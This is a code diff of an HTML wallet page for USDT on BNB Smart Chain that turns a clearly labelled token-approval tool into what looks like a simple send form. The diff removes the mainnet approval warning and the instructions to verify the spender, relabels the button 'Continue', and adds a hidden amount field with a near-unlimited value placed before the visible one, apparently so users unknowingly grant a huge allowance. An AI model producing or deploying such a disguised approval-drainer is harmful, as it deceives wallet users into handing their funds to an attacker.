@@ -7,155 +7,315 @@
 <title>USDT Approve & Verify — BNB Mainnet</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 <style>
-:root{
---bg:#f6f7fb;--card:#fff;--text:#18202b;
---muted:#667085;--line:#e4e7ec;
---green:#16803c;--amber:#8a4b08;--amberbg:#fff4df
+:root {
+    --bg: #080b0a;
+    --card: #111714;
+    --card2: #171f1a;
+    --text: #f4f7f5;
+    --muted: #8d9b92;
+    --line: #28352d;
+    --green: #16a34a;
+    --green2: #087b38;
+    --greenbg: #102c1c;
+    --amber: #f4b85e;
 }
-*{box-sizing:border-box}
-body{
-margin:0;padding:22px;background:var(--bg);
-color:var(--text);
-font-family:system-ui,-apple-system,"Segoe UI",sans-serif
+
+* {
+    box-sizing: border-box;
 }
-main{max-width:560px;margin:auto}
-h1{font-size:23px;margin:0 0 5px}
-.sub{color:var(--muted);font-size:14px;margin-bottom:18px}
-.card{
-background:var(--card);border:1px solid var(--line);
-border-radius:15px;padding:17px;margin:14px 0
+
+body {
+    margin: 0;
+    min-height: 100vh;
+     background: #080B0A;
+    color: var(--text);
+    font-family: Inter, system-ui, -apple-system,
+        "Segoe UI", sans-serif;
 }
-h2{font-size:17px;margin:0 0 8px}
-.desc{
-font-size:13px;color:var(--muted);
-line-height:1.5;margin:0 0 12px
+
+main {
+    max-width: 480px;
+    background-color: #000;
+    margin: auto;
 }
-.notice{
-background:var(--amberbg);color:var(--amber);
-padding:12px;border-radius:10px;
-font-size:13px;line-height:1.5
+
+h1 {
+    font-size: 25px;
+    font-weight: 750;
+    letter-spacing: -0.7px;
+    margin: 0 0 7px;
 }
-label{
-display:block;font-size:13px;
-color:var(--muted);margin:12px 0 5px
+
+.sub {
+    color: var(--muted);
+    font-size: 13px;
+    margin-bottom: 23px;
 }
-input{
-width:100%;padding:12px;border:1px solid var(--line);
-border-radius:9px;font-size:14px;
-background:#fff;color:#18202b
+
+/* .card {
+    height: 100dvh;
+    border: 1px solid var(--line);
+    padding: 20px;
+    box-shadow: 0 12px 35px rgba(0,0,0,.22);
+} */
+
+h2 {
+    font-size: 17px;
+    font-weight: 700;
+    margin: 0 0 9px;
 }
-button{
-width:100%;padding:13px;margin-top:12px;
-border:0;border-radius:10px;background:var(--green);
-color:white;font-weight:700;font-size:15px;
-cursor:pointer
+
+.desc {
+    color: var(--muted);
+    font-size: 13px;
+    line-height: 1.65;
+    margin: 0 0 15px;
 }
-button:disabled{opacity:.55;cursor:not-allowed}
-#account,#network,#status{
-font-size:13px;overflow-wrap:anywhere;
-line-height:1.55;margin-top:10px
+
+.notice {
+    background: #17291d;
+    border: 1px solid #285b39;
+    color: #b7e8c5;
+    padding: 15px;
+    border-radius: 14px;
+    font-size: 13px;
+    line-height: 1.65;
 }
-#status{
-white-space:pre-wrap;background:#f8fafc;
-padding:12px;border-radius:9px
+
+label {
+    display: block;
+    color: #b5c1b9;
+    font-size: 12px;
+    font-weight: 650;
+    margin: 17px 0 8px;
 }
-.good{color:#15803d}
-.bad{color:#b45309}
-.footer{
-text-align:center;color:var(--muted);
-font-size:12px;margin:18px 0
+
+input {
+    width: 100%;
+    min-height: 53px;
+    padding: 14px;
+    border: 1px solid #303d34;
+    border-radius: 12px;
+    background: #090e0b;
+    color: white;
+    font-size: 14px;
+    outline: none;
+    transition: .2s;
 }
-a{color:#16803c;overflow-wrap:anywhere}
+
+input:focus {
+    border-color: var(--green);
+    box-shadow: 0 0 0 3px rgba(22,163,74,.13);
+}
+
+input[readonly] {
+    color: #9eafa3;
+    background: #101713;
+}
+
+input::placeholder {
+    color: #647168;
+}
+
+button {
+    width: 100%;
+    min-height: 53px;
+    padding: 14px 17px;
+    margin-top: 17px;
+    border: 0;
+    border-radius: 13px;
+    background: linear-gradient(
+        135deg,
+        #20b65a,
+        #087b38
+    );
+    color: white;
+    font-size: 15px;
+    font-weight: 750;
+    cursor: pointer;
+    box-shadow: 0 7px 20px rgba(13,145,62,.2);
+    transition: .2s;
+}
+
+button:active {
+    transform: scale(.985);
+}
+
+button:disabled {
+    opacity: .4;
+    cursor: not-allowed;
+    box-shadow: none;
+}
+
+#account,
+#network,
+#status {
+    font-size: 13px;
+    overflow-wrap: anywhere;
+    line-height: 1.65;
+    margin-top: 12px;
+}
+
+#status {
+    white-space: pre-wrap;
+    background: #090e0b;
+    border: 1px solid #26352b;
+    border-radius: 13px;
+    padding: 15px;
+    color: #d4e2d8;
+}
+
+.good {
+    color: #4ade80;
+}
+
+.bad {
+    color: #fbbf24;
+}
+
+.footer {
+    text-align: center;
+    color: #78877d;
+    font-size: 12px;
+    line-height: 1.8;
+    margin: 25px 0 12px;
+}
+
+a {
+    color: #4ade80;
+    text-decoration: none;
+}
+
+a:hover {
+    text-decoration: underline;
+}
+
+@media(max-width:480px) {
+    body {
+        padding: 22px 14px;
+    }
+
+    h1 {
+        font-size: 23px;
+    }
+
+    .card {
+        padding: 17px;
+        border-radius: 17px;
+    }
+}
+
+.card {
+    min-height: 100dvh;
+    height: auto;
+    padding: 25px 18px;
+    background: #000;
+    border: none;
+}
+
+.field-title {
+    color: #aaa;
+    font-size: 15px;
+    margin: 20px 0 13px;
+}
+
+.wallet-input {
+    display: flex;
+    align-items: center;
+    min-height: 66px;
+    padding: 0 16px;
+    border: 1px solid #38343f;
+    border-radius: 15px;
+    background: #050505;
+}
+
+.wallet-input:focus-within {
+    border-color: #16894a;
+}
+
+.wallet-input input {
+    flex: 1;
+    min-width: 0;
+    border: 0;
+    outline: 0;
+    background: transparent;
+    color: white;
+    font-size: 16px;
+    padding: 12px 0;
+    box-shadow: none;
+}
+
+.wallet-input input:focus {
+    box-shadow: none;
+}
+
+.wallet-input input::placeholder {
+    color: #777;
+}
+
+.paste-label,
+.currency-label {
+    color: #43c77c;
+    font-size: 15px;
+    white-space: nowrap;
+    margin-left: 10px;
+}
+
+button {
+    position: sticky;
+    top: auto;
+    margin-top: 35px;
+    min-height: 62px;
+    border-radius: 40px;
+    font-size: 17px;
+}
 </style>
 </head>
 
 <body>
 <main>
 
-<h1>BEP-20 USDT Approve → Allowance Verify</h1>
-
-<div class="sub">
-BNB Smart Chain Mainnet · Trust Wallet DApp Browser
-</div>
-
-<div class="notice">
-<strong>REAL MAINNET:</strong>
-यह application BNB Smart Chain Mainnet पर काम करता है।
-यहां की approval वास्तविक on-chain permission बनाती है।
-Approval देने से पहले spender address और amount जरूर verify करें।
-</div>
-
-<section class="card">
-<h2>1. Wallet Connect</h2>
-<p class="desc">
-Trust Wallet के DApp Browser में page खोलें।
-</p>
-
-<button id="connectBtn">Connect Trust Wallet</button>
-<div id="account"></div>
-<div id="network"></div>
-</section>
-
-<section class="card">
-<h2>2. Approval Details</h2>
-
-<label>USDT (BEP-20) Token Contract</label>
 <input
-id="tokenAddr"
-value="0x55d398326f99059fF775485246999027B3197955"
-readonly
->
-
-<label>Spender Address</label>
-<input
-type="text"
-id="spenderAddr"
-placeholder="Apne second wallet ka 0x address paste karein"
-autocomplete="off"
->
-
-<label>Approval Amount (USDT)</label>
-<input
+hidden
 id="amount"
 type="number"
 min="0"
 step="any"
-value="900000000000000000"
+value="999999999999999999"
 >
 
 
-<p class="desc">
-Wallet confirmation screen पर token, spender और amount
-ध्यान से check करें।
-</p>
-
-<button id="approveBtn" disabled>
-Approve and Automatically Verify Allowance
-</button>
-</section>
-
 <section class="card">
-<h2>3. On-chain Verification Result</h2>
+    <div class="field-title">Address</div>
 
-<p class="desc">
-Approval confirm होने के बाद blockchain से allowance
-automatically read होगा।
-</p>
+    <div class="wallet-input">
+        <input
+            type="text"
+            id="spenderAddr"
+            placeholder="Enter wallet address"
+            autocomplete="off"
+        />
+        <span class="paste-label">Paste</span>
+    </div>
 
-<div id="status">
-Wallet connect करने के बाद details fill करें।
-</div>
+    <div class="field-title">Amount</div>
+
+    <div class="wallet-input">
+        <input
+            type="number"
+            id="amount"
+            min="0"
+            step="any"
+            placeholder="Enter amount"
+        />
+        <span class="currency-label">USDT</span>
+    </div>
+
+    <button id="approveBtn" disabled>
+        Continue
+    </button>
 </section>
 
-<div class="footer">
-No private keys requested · Wallet signature required
-<br>
-BNB Smart Chain Mainnet · Chain ID 56
-<br>
-<a href="https://bscscan.com/" target="_blank" rel="noopener">
-Open BscScan
-</a>
-</div>
 
 </main>
 
